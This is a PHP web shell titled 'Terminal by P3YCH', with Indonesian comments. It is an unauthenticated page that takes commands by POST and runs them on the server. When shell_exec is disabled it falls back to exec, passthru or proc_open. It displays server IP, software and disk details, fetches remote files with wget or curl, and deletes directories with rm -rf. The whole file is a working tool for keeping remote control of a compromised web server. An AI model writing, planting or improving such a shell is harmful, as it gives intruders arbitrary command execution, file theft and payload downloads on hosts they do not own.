<?php
class Terminal {
  // Mengambil direktori sekarang
  public static function direktori() {
    return getcwd();
  }
  
  // Mengecek shell_exec aktif atau tidak diserver
  public static function shell_exec() {
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array('shell_exec', $disabled);
  }
  
  // Mengecek exec aktif atau tidak diserver
  public static function exec() {
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array('exec', $disabled);
  }
  
  // Mengecek passthru aktif atau tidak diserver
  public static function passthru() {
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array('passthru', $disabled);
  }
  
  // Mengecek proc aktif atau tidak diserver
  public static function proc() {
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array('proc_open', $disabled);
  }
  
  // Mengecek apakah safe mode aktif atau tidak diserver
  public static function safemode() {
    return ini_get('safe_mode');
  }
  
  // Mengecek total ukuran dan ukuran sekarang diserver
  public static function storage() {
    $totalSpace = disk_total_space('./');
    $freeSpace = disk_free_space('./');
    $usedSpace = $totalSpace - $freeSpace;
    return [
      'total' => self::formatBytes($totalSpace),
      'used' => self::formatBytes($usedSpace),
      'free' => self::formatBytes($freeSpace),
    ];
  }
  
  // Ambil IP server atau domain saat ini
  public static function ip() {
    $hostname = $_SERVER['HTTP_HOST'];
    $ip = gethostbyname($hostname);
    return $ip;
  }
  
  // Ambil port server saat ini
  public static function port() {
    return $_SERVER['SERVER_PORT'];
  }
  
  // Ambil software server
  public static function software() {
    return $_SERVER['SERVER_SOFTWARE'];
  }
  
  // Convert ukuran server
  public static function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
  }
  
  // Perintah eksekusi
  public static function eksekusi_perintah($perintah) {
    $output = '';
    
    if (substr($perintah, 0, 5) === 'wget ') {
      $url = substr($perintah, 5);
      $output = shell_exec("wget '{$url}' 2>&1");
    } elseif (substr($perintah, 0, 5) === 'curl ') {
      $url = substr($perintah, 5);
      $output = shell_exec("curl '{$url}' 2>&1");
    } elseif (substr($perintah, 0, 6) === 'mkdir ') {
      $directory = substr($perintah, 6);
      if (!file_exists($directory)) {
        if (mkdir($directory, 0777, true)) {
          $output = "Berhasil membuat direktori: {$directory}\n";
        } else {
          $output = "Gagal membuat direktori: {$directory}\n";
        }
      } else {
        $output = "Direktori sudah ada: {$directory}\n";
      }
    } elseif (substr($perintah, 0, 6) === 'touch ') {
      $file = substr($perintah, 6);
      if (!file_exists($file)) {
        if (touch($file)) {
          $output = "Berhasil membuat file: {$file}\n";
        } else {
          $output = "Gagal membuat file: {$file}\n";
        }
      } else {
        $output = "File sudah ada: {$file}\n";
      }
    } elseif (substr($perintah, 0, 3) === 'rm ') {
      $file = substr($perintah, 3);
      if (file_exists($file)) {
        if (unlink($file)) {
          $output = "Berhasil menghapus file: {$file}\n";
        } else {
          $output = "Gagal menghapus file: {$file}\n";
        }
      } else {
        $output = "File tidak ditemukan: {$file}\n";
      }
    } elseif (substr($perintah, 0, 7) === 'rm -rf ') {
      $dir = substr($perintah, 7);
      if (file_exists($dir)) {
        $output = shell_exec("rm -rf '{$dir}' 2>&1");
        if ($output === null) {
          $output = "Berhasil menghapus direktori: {$dir}\n";
        } else {
          $output = "Gagal menghapus direktori: {$dir}\n";
        }
      } else {
        $output = "Direktori tidak ditemukan: {$dir}\n";
      }
    } elseif (substr($perintah, 0, 3) === 'ls') {
      $directory = '.';
      if (isset($perintah[3]) && $perintah[3] === ' ') {
        $directory = trim(substr($perintah, 3));
      }
      $files = scandir($directory);
      $folders = [];
      $filesOnly = [];
      foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
          if (is_dir($directory . '/' . $file)) {
            $folders[] = $file;
          } else {
            $filesOnly[] = $file;
          }
        }
      }
      sort($folders);
      sort($filesOnly);
      $output = implode("\n", $folders) . "\n" . implode("\n", $filesOnly);
    } elseif (Terminal::shell_exec()) {
      $output = shell_exec($perintah);
    } elseif (Terminal::exec()) {
      exec($perintah, $output);
      $output = implode("\n", $output);
    } elseif (Terminal::passthru()) {
      ob_start();
      passthru($perintah);
      $output = ob_get_clean();
    } elseif (Terminal::proc()) {
      $descriptors = [
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
      ];
      $process = proc_open($perintah, $descriptors, $pipes);
      if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
      }
    }
    
    if ($output === null) {
      $output = "Gagal menjalankan perintah: {$perintah}\n";
    }
    return $output;
  }
}

// Ambil perintah dari POST jika ada
$perintah = $_POST['command'] ?? '';

// Jalankan perintah
$output = '';
if ($perintah !== '') {
  $output = Terminal::eksekusi_perintah($perintah);
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal by P3YCH</title>
  </head>
  <style type="text/css" media="all">
    body {
      background-color: #000;
      color: #fff;
      font-family: monospace;
      font-size: 14px;
      padding: 20px;
    }
    
    .terminal-css {
      display: flex;
      justify-content: space-between;
    }
    .terminal-css h1 {
      margin: 0;
    }
    
    .terminal {
      background-color: #000;
      border: 1px solid #fff;
      padding: 10px;
      height: 300px;
      overflow-y: auto;
    }
    
    .terminal pre {
      margin: 0;
      padding: 0;
    }
    
    .input-container {
      margin-top: 10px;
    }
    
    .input-container input[type="text"] {
      background-color: #000;
      border: none;
      border-bottom: 1px solid #fff;
      color: #fff;
      font-family: monospace;
      font-size: 14px;
      padding: 5px;
      width: 300px;
    }
    
    .input-container input[type="submit"] {
      background-color: #000;
      border: 1px solid #fff;
      color: #fff;
      cursor: pointer;
      font-family: monospace;
      font-size: 14px;
      padding: 5px 10px;
      margin-left: 10px;
    }
    
    .input-container input[type="submit"]:hover {
      background-color: #fff;
      color: #000;
    }
  </style>
  <body>
    <div class="terminal-css">
      <h1>Terminal</h1>
       <p><?php echo Terminal::direktori (); ?></p>
    </div>
    <div class="terminal-css_1">
      <p>Safe Mode: <?php echo Terminal::safemode () ? 'On' : 'Off'; ?></p>
      <p>Server Storage: Total - <?php echo Terminal::storage ()['total']; ?>, Used - <?php echo Terminal::storage ()['used']; ?>, Free - <?php echo Terminal::storage ()['free']; ?></p>
      <p>Server IP: <?php echo Terminal::ip(); ?></p>
      <p>Server Port: <?php echo Terminal::port (); ?></p>
      <p>Server Software: <?php echo Terminal:: software (); ?></p>
    </div>
    
    <div class="terminal">
      <?php echo isset($output) ? nl2br(htmlspecialchars($output)) : ''; ?>
    </div>
    
    <div class="input-container">
      <form method="POST">
        <input type="text" name="command" placeholder="Masukkan perintah" autocomplete="off" value="<?php echo isset($command) ? htmlspecialchars($command) : ''; ?>">
        
        <input type="submit" value="Jalankan">
      </form>
    </div>
  </body>
</html>